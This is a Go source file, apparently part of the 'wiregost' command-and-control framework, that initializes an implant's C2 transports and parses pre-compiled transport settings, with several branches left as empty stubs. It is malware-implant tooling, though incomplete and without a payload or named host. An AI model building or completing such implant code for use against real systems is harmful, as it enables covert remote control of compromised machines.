package transport

import (
	"errors"

	"github.com/maxlandon/wiregost/ghost/assets"
	"github.com/maxlandon/wiregost/ghost/security"
	tpb "github.com/maxlandon/wiregost/proto/v1/gen/go/transport"
)

// InitTransports - This function starts all the required components of the implant C2.
// It does not takes care of routing components.
// The functions checks for all compiled/available transports FOR IMPLANT COMMUNICATIONS/RPC ONLY.
// It inits the full transport system, with its "rotating" schemes and bind/reverse handlers.
func InitTransports() (err error) {

	tpLog.Infof("Initializing implant communications")

	startup, err := ParseCompiledTransports()
	// We have either an empty transport or an error from parsing.
	if err != nil || startup.LHost == "" {
		tpLog.Error(err)
		security.Exit()
	}

	// Start it and add to active
	Transports.Add(startup, true)

	// Bind startup transport stream to the implant's main channel

	return
}

// ParseCompiledTransports - Get pre-compiled transports. We only return the one used for startup communications.
func ParseCompiledTransports() (startup *tpb.Transport, err error) {

	if assets.StartupTransport == "" && assets.OtherTransports == "" {
		return startup, errors.New("failed to parse/find any pre-compiled transport")
	}
	if assets.StartupTransport != "" {

	}

	// Add other compiled transports to the Transport list
	if assets.OtherTransports != "" {

	}

	return
}
